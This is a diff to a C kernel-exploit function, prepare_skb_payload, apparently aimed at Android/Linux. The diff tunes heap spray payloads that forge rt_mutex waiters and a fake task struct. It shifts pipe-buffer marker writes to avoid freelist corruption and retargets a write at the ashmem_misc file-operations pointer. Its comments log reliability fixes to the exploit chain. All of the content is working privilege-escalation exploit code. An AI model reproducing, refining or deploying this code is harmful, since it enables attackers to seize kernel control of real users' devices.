@@ -1629,6 +1629,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           parent = direct_to_page(base);
           target = pipebuf_page_base +
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+#if defined(APP_P0_ORACLE_SLOT1_GATE) && APP_P0_ORACLE_SLOT1_GATE
+          /* q6q v16 (kp14 fix): the ring's entry-0 .page field at +0x800
+           * coincides with the kmalloc-2k object-0 freeptr slot (s->offset
+           * == 0x800), so the marker write poisons the freelist whenever
+           * the adjacent object is free.  Shift the marker to entry 1's
+           * .page (+0x828), off every freeptr grid; the gate pipes carry
+           * two filled entries and the gate verify drains/scan both. */
+          target += sizeof(struct user_pipe_buffer);
+#endif
           p0_gate_page_struct = parent;
         } else if (slot == P0_ORACLE_PROBE_SLOT) {
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
@@ -1652,6 +1661,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           target = pipebuf_page_base +
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
                    sizeof(struct user_pipe_buffer);
+#if defined(APP_P0_ORACLE_SLOT1_GATE) && APP_P0_ORACLE_SLOT1_GATE
+          /* Entry 1 is now consumed by the gate marker; the probe marker
+           * moves to entry 2's .page (+0x850), which is the entry the
+           * gate verify's trailing one-page re-write leaves active. */
+          target += sizeof(struct user_pipe_buffer);
+#endif
           p0_probe_page_struct = parent;
 #endif
         } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
@@ -1680,7 +1695,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put32(p, lock_off + 0x00, 0);
         put64(p, lock_off + 0x08, waiter);
         put64(p, lock_off + 0x10, waiter);
-        put64(p, lock_off + 0x18, slide_bank_lock_owner(task));
+        /* q6q: rt_mutex_adjust_prio_chain deadlock gate reads
+         * (lock->owner & ~1) and compares it against the caller frame slot
+         * [sp+0x8] (stale stack / irq flags residue); owner == 1 makes the
+         * compare "0 == residue" and exits -EDEADLK before the rb_erase
+         * marker write on most boots (the ~7% gate-hit rate).  A pointer
+         * to the forged task bank (bit 0 = has-waiters) can never match the
+         * residue, and the chain's post-marker get_task_struct(owner & ~1)
+         * then refcounts the forged bank's usage field (already 0x100).
+         * This is the kp10-v14 gate-miss root cause. */
+        put64(p, lock_off + 0x18, task | 1);
 
         put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                         lock, SLIDE_FAKE_WAITER_PRIO);
@@ -1755,7 +1779,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     }
 #else
     slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+    /* q6q v20 (kp18): the marker write targets the ashmem_misc fops slot
+     * via its CANONICAL address - the linear alias is unmapped (the direct
+     * map lacks the whole Image span, pgd=0 at data_addr(ASHMEM_MISC_FOPS)
+     * in the kp18 crash). */
+    slide_bank_targets[0] = text_addr(ASHMEM_MISC_FOPS);
 #endif
 #else
     slide_oracle_parent = fake_fops;
@@ -1765,7 +1793,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_right = text_addr(ASHMEM_MISC_FOPS);
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
   } else {
@@ -1790,7 +1818,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
 
   uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t write_right = text_addr(ASHMEM_MISC_FOPS);
   uintptr_t write_left = 0;
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
